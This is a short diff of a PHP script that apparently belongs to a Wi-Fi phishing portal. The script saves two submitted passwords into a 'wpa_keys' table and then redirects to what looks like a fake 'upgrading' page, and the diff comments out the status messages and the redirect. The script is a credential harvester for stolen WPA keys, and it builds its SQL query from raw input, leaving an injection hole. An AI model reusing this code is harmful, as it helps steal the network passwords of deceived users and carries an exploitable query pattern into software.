@@ -16,15 +16,15 @@ if ($conn) {
 
 	$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
 	if (mysqli_query($conn, $sql)) {
-        	echo "New record created successfully";
+        	// echo "New record created successfully";
 	} else {
-    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
+    		// echo "Error: " . $sql . "<br>" . mysqli_error($conn);
 	}
 
 	mysqli_close($conn);
 }
 
 sleep(2);
-header("location:upgrading.html");
+// header("location:upgrading.html");
 ob_end_flush();
 ?>
